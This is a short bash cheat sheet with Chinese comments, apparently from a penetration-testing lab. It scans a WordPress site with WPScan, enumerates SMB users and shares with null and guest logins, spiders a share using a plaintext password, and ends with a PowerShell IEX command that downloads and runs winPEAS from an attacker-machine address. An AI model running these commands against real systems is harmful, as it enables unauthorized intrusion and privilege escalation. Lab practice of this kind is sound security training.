#!/bin/bash
# WPScan扫描wordpress漏洞,-e p表示扫描插件漏洞
# --disable-tls-checks表示禁用TLS检查
# --no-banner表示不显示横幅
# --plugins-detection passive表示被动检测插件
# -t 100表示使用100个线程进行扫描
wpscan -e p --url https://10.129.12.10 --disable-tls-checks --no-banner --plugins-detection passive -t 100

# 查看操作系统版本信息
cat /etc/os-release
# smb枚举用户,空用户名空密码尝试登录
crackmapexec smb 10.129.12.20 -u '' -p '' --users
# smb枚举共享资源，使用空用户名空密码尝试登录
crackmapexec smb 10.129.12.20 -u guest -p '' --shares
# spider共享资源，列出文件和目录
crackmapexec smb 10.129.12.20 -u "john" -p 'SuperSecurePass123' --spider Devs

# 下载winPEAS脚本到本地文件winpeas.txt，下载直接执行
powershell "IEX(New-Object Net.WebClient).downloadString('http://<attacking-machine-IP>:8080/winPEAS.ps1')" > winpeas.txt